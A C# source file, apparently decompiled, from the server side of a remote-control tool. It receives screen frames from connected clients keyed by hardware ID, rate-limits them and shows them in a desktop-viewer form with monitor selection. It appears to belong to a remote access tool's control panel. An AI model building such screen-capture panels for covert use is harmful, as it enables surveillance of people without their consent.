using System;
using System.Collections.Concurrent;
using System.Diagnostics;
using System.Drawing;
using System.Windows.Forms;
using Server.Connectings;
using Server.Forms;
using Server.Helper;

namespace Server.Messages;

internal class HandlerDesktop
{
	private static readonly ConcurrentDictionary<string, DateTime> _lastFrameTime = new ConcurrentDictionary<string, DateTime>();

	private static readonly TimeSpan _minFrameInterval = TimeSpan.FromMilliseconds(16.0);

	private static readonly ConcurrentDictionary<string, int> _frameDropCount = new ConcurrentDictionary<string, int>();

	public static void Read(Clients client, object[] objects)
	{
		if (client == null || objects == null || objects.Length < 2)
		{
			if (client != null)
			{
				client.Disconnect();
			}
			return;
		}
		switch ((string)objects[1])
		{
		case "Connect":
		{
			FormDesktop form4 = (FormDesktop)Application.OpenForms["Desktop:" + (string)objects[2]];
			if (form4 == null)
			{
				client.Disconnect();
				break;
			}
			form4.Invoke((MethodInvoker)delegate
			{
				form4.client = client;
				form4.screen = new Size((int)objects[3], (int)objects[4]);
				form4.Text = "Desktop [" + (string)objects[2] + "]";
				form4.materialSwitch1.Enabled = true;
				form4.materialSwitch2.Enabled = true;
				form4.materialSwitch3.Enabled = true;
				form4.materialSwitch4.Enabled = true;
				form4.numericUpDown2.Enabled = true;
				form4.rjComboBox1.Enabled = true;
				int num = 1;
				if (objects.Length >= 6 && objects[5] is string[] array)
				{
					num = array.Length;
				}
				form4.rjComboBox1.Items.Clear();
				for (int i = 0; i < num; i++)
				{
					form4.rjComboBox1.Items.Add($"Monitor {i + 1}");
				}
				if (num > 0)
				{
					form4.rjComboBox1.SelectedIndex = 0;
				}
			});
			client.Tag = form4;
			client.Hwid = (string)objects[2];
			break;
		}
		case "Size":
		{
			FormDesktop formSize = (FormDesktop)client.Tag;
			if (formSize != null && objects.Length >= 4)
			{
				formSize.Invoke((MethodInvoker)delegate
				{
					formSize.screen = new Size((int)objects[2], (int)objects[3]);
				});
			}
			break;
		}
		case "Monitors":
		{
			FormDesktop form3 = (FormDesktop)client.Tag;
			if (form3 == null)
			{
				break;
			}
			int monitorCount = (int)objects[2];
			form3.Invoke((MethodInvoker)delegate
			{
				form3.rjComboBox1.Items.Clear();
				for (int i = 0; i < monitorCount; i++)
				{
					form3.rjComboBox1.Items.Add($"Monitor {i + 1}");
				}
				if (monitorCount > 0)
				{
					form3.rjComboBox1.SelectedIndex = 0;
				}
			});
			break;
		}
		case "Screen":
		{
			FormDesktop form2 = (FormDesktop)client.Tag;
			if (form2 == null)
			{
				client.Disconnect();
				break;
			}
			string clientKey = client.IP + ":" + client.Hwid + ":desktop";
			DateTime now = DateTime.UtcNow;
			if (_lastFrameTime.TryGetValue(clientKey, out var lastFrame) && now - lastFrame < _minFrameInterval)
			{
				_frameDropCount.AddOrUpdate(clientKey, 1, (string k, int v) => v + 1);
				break;
			}
			_lastFrameTime[clientKey] = now;
			Bitmap bitmap = Methods.ByteArrayToBitmap((byte[])objects[2]);
			form2.FPS++;
			if (form2.sw.ElapsedMilliseconds >= 1000)
			{
				form2.Text = $"Desktop [{client.Hwid}]  Fps[{form2.FPS}] Data[{Methods.BytesToString(((byte[])objects[2]).Length)}] Size[{bitmap.Width}x{bitmap.Height}] Screen[{form2.screen.Width}x{form2.screen.Height}]";
				form2.FPS = 0;
				form2.sw = Stopwatch.StartNew();
			}
			form2.pictureBox1.Invoke((MethodInvoker)delegate
			{
				form2.pictureBox1.Image = bitmap;
			});
			break;
		}
		}
	}
}
